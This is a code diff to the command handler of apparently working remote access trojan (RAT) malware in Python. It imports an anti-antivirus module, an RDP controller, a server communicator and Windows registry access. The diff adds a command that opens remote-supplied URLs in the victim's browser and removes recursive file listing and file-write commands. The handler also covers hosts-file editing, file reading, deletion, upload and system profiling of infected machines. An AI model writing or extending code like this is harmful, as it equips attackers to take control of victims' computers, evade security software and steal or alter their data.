@@ -7,14 +7,14 @@ import base64
 import os
 import shutil
 import datetime
-import time  # Added import for time
+import time
 import ctypes
 import winreg
 from rat_config import Config
 from monitoring.rdp_controller import RDPController
 from encryption.manager import EncryptionManager
 from network.communicator import ServerCommunicator
-from system.anti_av import AntiAV  # Added import for AntiAV
+from system.anti_av import AntiAV
 
 class CommandError(Exception):
     pass
@@ -61,7 +61,7 @@ class CommandHandler:
                 'memory': psutil.virtual_memory()._asdict(),
                 'disk': psutil.disk_usage('/')._asdict(),
                 'online': True,
-                'last_seen': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),  # Fixed datetime.now()
+                'last_seen': datetime.datetime.now().isoformat(),
                 'behavior': Config.behavior if hasattr(Config, 'behavior') else {}
             }
             logging.info("Status collected successfully")
@@ -69,6 +69,44 @@ class CommandHandler:
         except Exception as e:
             logging.error(f"Failed to collect status: {str(e)}")
             raise CommandError(f"Failed to collect status: {str(e)}")
+
+    @staticmethod
+    def handle_open_url(params):
+        url = params.get('url')
+        if not url:
+            if Config.DEBUG_MODE:
+                logging.error("No URL provided")
+            raise CommandError("No URL provided")
+        
+        try:
+            import webbrowser
+            
+            # Log the URL being opened
+            logging.info(f"Opening URL: {url}")
+            
+            # Open URL in default browser
+            result = webbrowser.open(url)
+            
+            if result:
+                if Config.DEBUG_MODE:
+                    logging.info(f"Successfully opened URL: {url}")
+                return {
+                    'status': 'success',
+                    'message': f'URL opened: {url}',
+                    'url': url
+                }
+            else:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Failed to open URL: {url}")
+                return {
+                    'status': 'error',
+                    'message': f'Failed to open URL: {url}',
+                    'url': url
+                }
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to open URL: {str(e)}")
+            raise CommandError(f"Failed to open URL: {str(e)}")
 
     @staticmethod
     def handle_cleanup_rdp(params):
@@ -307,60 +345,6 @@ class CommandHandler:
                     logging.info(f"Directory listing for {path}: {len(result)} items")
                 return {'files': result}
             
-            elif action == 'recursive_list':
-                if not os.path.exists(path):
-                    if Config.DEBUG_MODE:
-                        logging.error(f"Path does not exist: {path}")
-                    raise CommandError(f"Path does not exist: {path}")
-                
-                result = []
-                def scan_directory(current_path, depth=0):
-                    try:
-                        for entry in os.listdir(current_path):
-                            full_path = os.path.join(current_path, entry)
-                            try:
-                                stat = os.stat(full_path)
-                                result.append({
-                                    'path': full_path,
-                                    'name': entry,
-                                    'type': 'directory' if os.path.isdir(full_path) else 'file',
-                                    'size': stat.st_size,
-                                    'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
-                                    'depth': depth
-                                })
-                                if os.path.isdir(full_path) and not os.path.islink(full_path):
-                                    scan_directory(full_path, depth + 1)
-                            except (PermissionError, OSError) as e:
-                                result.append({
-                                    'path': full_path,
-                                    'name': entry,
-                                    'type': 'error',
-                                    'error': str(e),
-                                    'depth': depth
-                                })
-                    except (PermissionError, OSError) as e:
-                        result.append({
-                            'path': current_path,
-                            'name': os.path.basename(current_path),
-                            'type': 'error',
-                            'error': str(e),
-                            'depth': depth
-                        })
-                
-                scan_directory(path)
-                temp_file = "recursive_list.txt"
-                with open(temp_file, 'w', encoding='utf-8') as f:
-                    for item in result:
-                        indent = "  " * item['depth']
-                        if item['type'] == 'error':
-                            f.write(f"{indent}[ERROR] {item['path']}: {item['error']}\n")
-                        else:
-                            size = round(item['size'] / 1024, 2)
-                            f.write(f"{indent}{item['type'][0].upper()}: {item['path']} ({size} KB, {item['modified']})\n")
-                if Config.DEBUG_MODE:
-                    logging.info(f"Recursive listing for {path} completed, saved to {temp_file}")
-                return {'file_path': temp_file}
-            
             elif action == 'read':
                 if not os.path.isfile(path):
                     if Config.DEBUG_MODE:
@@ -375,18 +359,6 @@ class CommandHandler:
                 if Config.DEBUG_MODE:
                     logging.info(f"File read successfully: {path}")
                 return {'content': content, 'file_path': path}
-            
-            elif action == 'write':
-                content = params.get('content')
-                if not content:
-                    if Config.DEBUG_MODE:
-                        logging.error("Missing content for write operation")
-                    raise CommandError("Missing content for write operation")
-                with open(path, 'w', encoding='utf-8') as f:
-                    f.write(content)
-                if Config.DEBUG_MODE:
-                    logging.info(f"File written successfully: {path}")
-                return {'status': 'success', 'file_path': path}
             
             elif action == 'delete':
                 if not os.path.exists(path):
@@ -493,25 +465,6 @@ class CommandHandler:
             if Config.DEBUG_MODE:
                 logging.error(f"Edit hosts failed: {str(e)}")
             raise CommandError(f"Edit hosts failed: {str(e)}")
-
-    @staticmethod
-    def handle_open_url(params):
-        url = params.get('url')
-        if not url:
-            if Config.DEBUG_MODE:
-                logging.error("No URL provided")
-            raise CommandError("No URL provided")
-        
-        try:
-            import webbrowser
-            webbrowser.open(url)
-            if Config.DEBUG_MODE:
-                logging.info(f"Opened URL: {url}")
-            return {'status': 'success'}
-        except Exception as e:
-            if Config.DEBUG_MODE:
-                logging.error(f"Failed to open URL: {str(e)}")
-            raise CommandError(f"Failed to open URL: {str(e)}")
 
     @staticmethod
     def handle_upload_file(params):
